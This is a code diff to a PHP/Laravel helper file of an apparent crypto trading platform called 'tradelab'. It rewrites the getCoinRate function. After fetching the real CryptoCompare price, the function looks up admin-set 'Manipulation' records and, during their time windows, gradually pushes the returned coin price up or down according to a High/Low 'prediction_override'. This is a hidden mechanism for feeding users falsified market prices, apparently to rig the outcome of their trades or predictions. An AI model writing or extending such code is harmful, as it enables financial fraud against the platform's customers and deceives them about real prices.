@@ -17,6 +17,9 @@ use App\Lib\GoogleAuthenticator;
 use App\Models\User;
 use Illuminate\Support\Facades\Cache;
 
+use App\Models\CryptoCurrency;
+use App\Models\Manipulation;
+
 function systemDetails()
 {
     $system['name']          = 'tradelab';
@@ -437,10 +440,67 @@ function gs()
 
 function getCoinRate($coinId)
 {
-    $url        = 'https://min-api.cryptocompare.com/data/price?fsym=' . $coinId . '&tsyms=USD';
-    $crypto     = file_get_contents($url);
-    $usd        = json_decode($crypto, true);
+    // 1. Fetch real crypto rate from API
+    $url    = 'https://min-api.cryptocompare.com/data/price?fsym=' . $coinId . '&tsyms=USD';
+    $crypto = @file_get_contents($url); // Suppress warning if API fails
+    $usd    = json_decode($crypto, true);
+
+    if (!is_array($usd) || !isset($usd['USD'])) {
+        \Log::error('CryptoCompare API error or invalid response.', ['response' => $usd, 'url' => $url]);
+        return null; // Or handle gracefully as per your needs
+    }
+
     $cryptoRate = $usd['USD'];
+
+    // 2. Get current time
+    $now = Carbon::now();
+
+    // 3. Find crypto record by symbol
+    $cryptoModel = CryptoCurrency::select('id')->where('symbol', $coinId)->first();
+    if (!$cryptoModel) {
+        \Log::warning('CryptoCurrency not found for symbol', ['symbol' => $coinId]);
+        return $cryptoRate; // Return real rate if crypto is not found in DB
+    }
+
+    // 4. Find active manipulation for this crypto and time window
+    $manipulation = Manipulation::select('id', 'start_time', 'end_time', 'min', 'max', 'prediction_override')
+        ->where('crypto_id', $cryptoModel->id)
+        ->where('start_time', '<=', $now)
+        ->where('end_time', '>=', $now)
+        ->first();
+
+    // 5. If manipulation is active, smoothly adjust the value
+    if ($manipulation) {
+        $startTime = Carbon::parse($manipulation->start_time);
+        $endTime   = Carbon::parse($manipulation->end_time);
+        $min       = floatval($manipulation->min);
+        $max       = floatval($manipulation->max);
+
+        // Avoid division by zero
+        $totalSeconds   = max(1, $endTime->diffInSeconds($startTime));
+        $elapsedSeconds = max(0, $now->diffInSeconds($startTime));
+        $progress       = min(max($elapsedSeconds / $totalSeconds, 0), 1); // Clamp 0-1
+
+        // Linear interpolation for adjustment
+        $currentAdjustment = $min + ($max - $min) * $progress;
+
+        if ($manipulation->prediction_override == 1) { // High
+            $cryptoRate += $currentAdjustment;
+        } elseif ($manipulation->prediction_override == 2) { // Low
+            $cryptoRate = max(0, $cryptoRate - $currentAdjustment);
+        }
+
+        \Log::info('Current adjustment:', [
+            'cryptoModel' => $cryptoModel->id,
+            'manipulation' => $manipulation->id,
+            'currentAdjustment' => $currentAdjustment,
+            'progress' => $progress,
+            'min' => $min,
+            'max' => $max,
+            'cryptoRate' => $cryptoRate,
+        ]);
+    }
+
     return $cryptoRate;
 }
 
